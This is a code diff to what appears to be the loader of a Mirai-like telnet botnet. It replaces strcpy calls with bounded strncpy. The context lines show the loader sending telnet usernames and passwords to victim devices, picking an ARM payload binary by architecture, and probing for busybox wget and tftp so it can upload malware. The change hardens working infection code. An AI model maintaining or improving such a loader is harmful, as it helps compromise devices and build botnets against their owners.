@@ -289,7 +289,8 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                         if (consumed)
                         {
                             util_sockprintf(conn->fd, "%s", conn->info.user);
-                            strcpy(conn->output_buffer.data, "\r\n");
+                            strncpy(conn->output_buffer.data, "\r\n", sizeof(conn->output_buffer.data) - 1);
+                            conn->output_buffer.data[sizeof(conn->output_buffer.data) - 1] = '\0';
                             conn->output_buffer.deadline = time(NULL) + 1;
                             conn->state_telnet = TELNET_PASS_PROMPT;
                         }
@@ -299,7 +300,8 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                         if (consumed)
                         {
                             util_sockprintf(conn->fd, "%s", conn->info.pass);
-                            strcpy(conn->output_buffer.data, "\r\n");
+                            strncpy(conn->output_buffer.data, "\r\n", sizeof(conn->output_buffer.data) - 1);
+                            conn->output_buffer.data[sizeof(conn->output_buffer.data) - 1] = '\0';
                             conn->output_buffer.deadline = time(NULL) + 1;
                             conn->state_telnet = TELNET_WAITPASS_PROMPT; // At the very least it will print SOMETHING
                         }
@@ -537,7 +539,9 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                                 if (!conn->retry_bin && strncmp(conn->info.arch, "arm", 3) == 0)
                                 {
                                     conn->echo_load_pos = 0;
-                                    strcpy(conn->info.arch, (conn->info.arch[3] == '\0' ? "arm7" : "arm"));
+                                    const char *new_arch = (conn->info.arch[3] == '\0' ? "arm7" : "arm");
+                                    strncpy(conn->info.arch, new_arch, sizeof(conn->info.arch) - 1);
+                                    conn->info.arch[sizeof(conn->info.arch) - 1] = '\0';
                                     conn->bin = binary_get_by_arch(conn->info.arch);
                                     util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
                                     conn->state_telnet = TELNET_UPLOAD_METHODS;
@@ -619,7 +623,9 @@ static void *timeout_thread(void *arg)
                     conn->ctrlc_retry = TRUE;
 
                     conn->echo_load_pos = 0;
-                    strcpy(conn->info.arch, (conn->info.arch[3] == '\0' ? "arm7" : "arm"));
+                    const char *new_arch = (conn->info.arch[3] == '\0' ? "arm7" : "arm");
+                    strncpy(conn->info.arch, new_arch, sizeof(conn->info.arch) - 1);
+                    conn->info.arch[sizeof(conn->info.arch) - 1] = '\0';
                     conn->bin = binary_get_by_arch(conn->info.arch);
                     util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
                     conn->state_telnet = TELNET_UPLOAD_METHODS;
